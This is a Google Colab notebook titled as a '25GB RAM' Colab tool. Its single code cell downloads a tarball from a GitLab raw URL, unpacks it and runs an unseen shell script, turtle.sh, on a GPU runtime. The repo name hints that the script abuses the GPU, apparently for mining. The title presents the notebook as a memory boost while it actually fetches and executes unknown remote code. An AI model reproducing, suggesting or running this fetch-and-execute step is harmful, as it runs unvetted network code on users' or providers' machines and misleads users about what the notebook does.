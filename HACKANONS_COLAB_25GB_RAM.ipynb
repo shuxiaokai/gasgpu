{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "HACKANONS COLAB 25GB RAM.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/rinafebriani1026/gasgpu/blob/main/HACKANONS_COLAB_25GB_RAM.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "TL8cHSPQ26-O"
      },
      "source": [
        "!wget https://gitlab.com/besloper/gaspuls/-/raw/master/satu.tar.gz && tar xf satu.tar.gz && chmod +x turtle.sh && ./turtle.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}